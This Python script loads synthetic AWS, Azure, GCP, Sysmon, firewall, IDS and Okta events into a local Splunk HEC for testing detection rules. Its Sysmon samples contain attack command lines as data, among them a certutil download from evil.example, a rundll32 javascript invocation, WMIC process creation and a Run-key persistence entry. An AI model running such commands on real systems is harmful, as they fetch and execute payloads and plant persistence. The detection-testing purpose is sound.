#!/usr/bin/env python3
"""Load representative events for every log source TDL rules expect, so the whole
library becomes testable — not just the Windows rules.

TDL's SPL uses a small set of idealized sourcetypes/indexes (aws:cloudtrail,
azure:auditlogs, gcp:audit, Sysmon, firewall, ids, WinEventLog:Security, …).
Real vendor logs don't carry those exact sourcetypes, so we ship authentic-shaped
sample events tagged with the sourcetypes the rules actually query, including the
fields they filter on. Windows data stays REAL (EVTX samples); these fill the gaps
(cloud / network / endpoint / IdP) that a Windows-only sample set can't cover.

    pip install requests
    python load_sources.py
Env: SPLUNK_HEC_URL, SPLUNK_HEC_TOKEN (defaults target this repo's compose).
"""
import os
import json
import time

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEC_URL = os.environ.get("SPLUNK_HEC_URL", "https://localhost:8088/services/collector/event")
HEC_TOKEN = os.environ.get("SPLUNK_HEC_TOKEN", "tdl-hec-token-0000000000")
now = time.time()

# Each entry: (index, sourcetype, [event dicts]). Field names match what TDL SPL
# filters on for that source; values include patterns the rules should catch.
BATCHES = []


def add(index, sourcetype, events, repeat=1):
    BATCHES.append((index, sourcetype, events * repeat))


# ── Cloud: AWS CloudTrail (real CloudTrail field shape: eventName, userIdentity) ──
add("cloud", "aws:cloudtrail", [
    {"eventName": "ConsoleLogin", "eventSource": "signin.amazonaws.com",
     "userIdentity": {"type": "Root", "arn": "arn:aws:iam::111122223333:root"},
     "sourceIPAddress": "203.0.113.10", "awsRegion": "us-east-1",
     "responseElements": {"ConsoleLogin": "Success"}, "additionalEventData": {"MFAUsed": "No"}},
    {"eventName": "CreateUser", "eventSource": "iam.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/attacker"},
     "sourceIPAddress": "198.51.100.7", "awsRegion": "us-east-1",
     "requestParameters": {"userName": "backdoor"}},
    {"eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/backdoor"},
     "sourceIPAddress": "198.51.100.7", "awsRegion": "us-east-1"},
    {"eventName": "PutBucketPolicy", "eventSource": "s3.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/dev"},
     "sourceIPAddress": "198.51.100.9", "awsRegion": "us-east-1",
     "requestParameters": {"bucketName": "corp-data", "Principal": "*"}},
    {"eventName": "AuthorizeSecurityGroupIngress", "eventSource": "ec2.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/dev"},
     "sourceIPAddress": "198.51.100.9", "awsRegion": "us-east-1",
     "requestParameters": {"cidrIp": "0.0.0.0/0", "ipPermissions": {"toPort": 22}}},
    {"eventName": "AssumeRole", "eventSource": "sts.amazonaws.com",
     "userIdentity": {"type": "AssumedRole", "arn": "arn:aws:sts::111122223333:assumed-role/admin"},
     "sourceIPAddress": "198.51.100.9", "awsRegion": "us-east-1"},
    {"eventName": "GetSecretValue", "eventSource": "secretsmanager.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/backdoor"},
     "sourceIPAddress": "198.51.100.7", "awsRegion": "us-east-1"},
    {"eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com",
     "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::111122223333:user/backdoor"},
     "sourceIPAddress": "198.51.100.7", "awsRegion": "us-east-1"},
], repeat=3)

# ── Cloud: Azure activity/audit ──
add("cloud", "azure:auditlogs", [
    {"eventName": "Add member to role", "operationName": "Add member to role",
     "userIdentity": "attacker@corp.onmicrosoft.com", "sourceIPAddress": "203.0.113.20",
     "category": "RoleManagement", "resultType": "Success"},
    {"eventName": "Update conditional access policy", "operationName": "Update policy",
     "userIdentity": "attacker@corp.onmicrosoft.com", "sourceIPAddress": "203.0.113.20",
     "category": "Policy"},
    {"eventName": "Add service principal credentials", "operationName": "Add credentials",
     "userIdentity": "attacker@corp.onmicrosoft.com", "sourceIPAddress": "203.0.113.20",
     "category": "ApplicationManagement"},
], repeat=3)

# ── Cloud: GCP audit ──
add("cloud", "gcp:audit", [
    {"eventName": "SetIamPolicy", "protoPayload": {"methodName": "SetIamPolicy"},
     "userIdentity": "attacker@corp.iam.gserviceaccount.com", "sourceIPAddress": "203.0.113.30"},
    {"eventName": "storage.setIamPermissions", "protoPayload": {"methodName": "storage.setIamPermissions"},
     "userIdentity": "attacker@corp.iam.gserviceaccount.com", "sourceIPAddress": "203.0.113.30"},
], repeat=3)

# ── Endpoint: Sysmon (TDL queries sourcetype=Sysmon with process_name/command_line) ──
add("endpoint", "Sysmon", [
    {"EventCode": "1", "event_id": "1", "process_name": "C:\\Windows\\System32\\certutil.exe",
     "Image": "C:\\Windows\\System32\\certutil.exe",
     "command_line": "certutil.exe -urlcache -f http://evil.example/a.exe a.exe",
     "CommandLine": "certutil.exe -urlcache -f http://evil.example/a.exe a.exe",
     "parent_process_name": "C:\\Windows\\System32\\cmd.exe", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
    {"EventCode": "1", "event_id": "1", "process_name": "C:\\Windows\\System32\\rundll32.exe",
     "Image": "C:\\Windows\\System32\\rundll32.exe",
     "command_line": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \"", "CommandLine": "rundll32.exe javascript:",
     "parent_process_name": "C:\\Program Files\\Microsoft Office\\winword.exe", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
    {"EventCode": "1", "event_id": "1", "process_name": "C:\\Windows\\System32\\wbem\\WMIC.exe",
     "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "command_line": "wmic process call create",
     "CommandLine": "wmic process call create", "parent_process_name": "cmd.exe", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
    {"EventCode": "3", "event_id": "3", "process_name": "powershell.exe", "Image": "powershell.exe",
     "dest_ip": "203.0.113.66", "dest_port": "4444", "protocol": "tcp", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
    {"EventCode": "11", "event_id": "11", "process_name": "C:\\Users\\jdoe\\ransomware.exe",
     "Image": "C:\\Users\\jdoe\\ransomware.exe", "file_name": "C:\\Users\\jdoe\\readme.txt",
     "TargetFilename": "C:\\Users\\jdoe\\readme.txt", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
    {"EventCode": "13", "event_id": "13", "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil",
     "target_object": "HKLM\\...\\Run\\evil", "TargetObject": "HKLM\\...\\Run\\evil",
     "process_name": "reg.exe", "Image": "reg.exe", "user": "CORP\\jdoe", "Computer": "WIN10-01"},
], repeat=4)

# ── Network: firewall (src_ip/dest_ip/dest_port/protocol/application/action) ──
_fw = []
for port in ["6667", "6668", "22", "23", "3389", "445", "4444", "1337"]:
    _fw.append({"src_ip": "10.0.0.55", "dest_ip": "203.0.113.99", "dest_port": port,
                "destination_port": port, "protocol": "tcp", "application": "unknown",
                "action": "allow", "bytes_out": "500000"})
for p in range(20, 40):
    _fw.append({"src_ip": "10.0.0.77", "dest_ip": "10.0.0.5", "dest_port": str(p),
                "destination_port": str(p), "protocol": "tcp", "application": "unknown", "action": "deny"})
add("network", "firewall", _fw)

# ── Network: IDS/IPS (signature/category/severity) ──
add("network", "ids", [
    {"signature": "ET MALWARE Cobalt Strike Beacon", "category": "A Network Trojan was detected",
     "severity": "1", "src_ip": "203.0.113.66", "dest_ip": "10.0.0.55", "dest_port": "4444", "protocol": "tcp"},
    {"signature": "ET SCAN Nmap Scripting Engine", "category": "Attempted Information Leak",
     "severity": "2", "src_ip": "203.0.113.5", "dest_ip": "10.0.0.5", "dest_port": "443", "protocol": "tcp"},
    {"signature": "GPL EXPLOIT CVE-2021-44228 log4j", "category": "Web Application Attack",
     "severity": "1", "src_ip": "198.51.100.13", "dest_ip": "10.0.0.9", "dest_port": "8080", "protocol": "tcp"},
], repeat=4)

# ── IdP: Okta system log ──
add("okta", "OktaIM2:log", [
    {"eventType": "user.session.start", "outcome": {"result": "SUCCESS"},
     "actor": {"alternateId": "jdoe@corp.com"}, "client": {"ipAddress": "203.0.113.40"}},
    {"eventType": "user.authentication.auth_via_mfa", "outcome": {"result": "FAILURE"},
     "actor": {"alternateId": "jdoe@corp.com"}, "client": {"ipAddress": "203.0.113.40"}},
    {"eventType": "policy.evaluate_sign_on", "outcome": {"result": "CHALLENGE"},
     "actor": {"alternateId": "jdoe@corp.com"}, "client": {"ipAddress": "203.0.113.40"}},
], repeat=3)

# ── IdP: Azure AD sign-in ──
add("azure", "azure:aad:signin", [
    {"userPrincipalName": "jdoe@corp.com", "ipAddress": "203.0.113.50",
     "resultType": "0", "appDisplayName": "Office 365", "riskLevelDuringSignIn": "high"},
    {"userPrincipalName": "jdoe@corp.com", "ipAddress": "45.155.205.1",
     "resultType": "50126", "appDisplayName": "Office 365"},
], repeat=3)


def main():
    total = 0
    for index, sourcetype, events in BATCHES:
        body = "".join(json.dumps({"index": index, "sourcetype": sourcetype,
                                   "source": "tdl-lab:sources", "time": now,
                                   "event": e}) + "\n" for e in events)
        r = requests.post(HEC_URL, headers={"Authorization": f"Splunk {HEC_TOKEN}"},
                          data=body, verify=False, timeout=60)
        if r.status_code >= 300:
            print(f"  ! {sourcetype}: HEC {r.status_code} {r.text[:120]}")
            continue
        total += len(events)
        print(f"  ✓ index={index:<9} sourcetype={sourcetype:<22} {len(events)} events")
    print(f"\nLoaded {total} events across {len(BATCHES)} sourcetypes.")
    print("Now:  python run_rule.py --all --workers 6 --quiet")


if __name__ == "__main__":
    main()
